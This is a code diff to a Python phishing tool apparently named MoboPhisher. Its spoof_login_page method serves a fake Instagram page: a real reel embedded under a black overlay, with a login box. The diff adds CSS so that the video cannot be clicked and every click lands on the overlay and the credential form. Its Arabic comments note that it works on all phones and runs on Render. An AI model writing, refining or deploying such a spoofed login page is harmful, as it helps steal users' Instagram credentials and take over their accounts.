@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram + فيديو مسدود + متوافقة مع Render
+# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram + فيديو مسدود غير قابل للضغط + متوافقة مع Render
 
 import os
 import sys
@@ -53,7 +53,7 @@ class MoboPhisher:
         conn.close()
 
     def spoof_login_page(self):
-        # هاد الصفحة كتوري فيديو إنستغرام مسدود تماماً بطبقة سوداء وكتطلب تسجيل الدخول
+        # هاد الصفحة كتوري فيديو إنستغرام مسدود تماماً وغير قابل للضغط
         return """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -99,6 +99,7 @@ class MoboPhisher:
             position: absolute;
             top: 0; left: 0;
             z-index: 1; /* تحت الطبقة السوداء */
+            pointer-events: none; /* هاد السطر هو اللي كيمنع الضغط على الفيديو */
         }
         .overlay {
             position: absolute;
@@ -109,6 +110,7 @@ class MoboPhisher:
             justify-content: center;
             background: #000; /* طبقة سوداء تغطي الفيديو تماماً */
             z-index: 10; /* فوق الفيديو */
+            pointer-events: auto; /* كيخلي الطبقة هي اللي كتستقبل الضغطات */
         }
         .lock-icon {
             font-size: 50px;
@@ -147,6 +149,7 @@ class MoboPhisher:
             transform: translate(-50%, -50%);
             z-index: 20;
             box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            pointer-events: auto; /* كيخلي صندوق الدخول قابل للضغط */
         }
         .login-box h2 {
             font-family: 'Billabong', 'Instagram Sans Script', cursive;
@@ -178,7 +181,7 @@ class MoboPhisher:
 </head>
 <body>
     <div class="video-container">
-        <!-- فيديو إنستغرام الأصلي (مخفي تحت الطبقة السوداء) -->
+        <!-- فيديو إنستغرام الأصلي (مخفي تحت الطبقة السوداء وغير قابل للضغط) -->
         <iframe class="video-iframe" src="https://www.instagram.com/reel/DcHCV27ilyM/embed/" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
         
         <div class="overlay" id="overlay">
